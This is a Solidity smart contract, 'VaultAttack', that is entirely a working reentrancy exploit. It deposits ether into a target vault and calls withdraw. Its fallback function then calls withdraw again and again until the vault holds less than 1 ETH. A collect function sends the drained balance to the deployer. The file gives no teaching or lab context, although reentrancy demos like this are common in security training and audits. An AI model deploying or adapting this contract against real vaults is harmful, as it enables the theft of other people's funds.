// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function withdraw() external;
    function deposit() external payable;
}

contract VaultAttack {
    IVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}
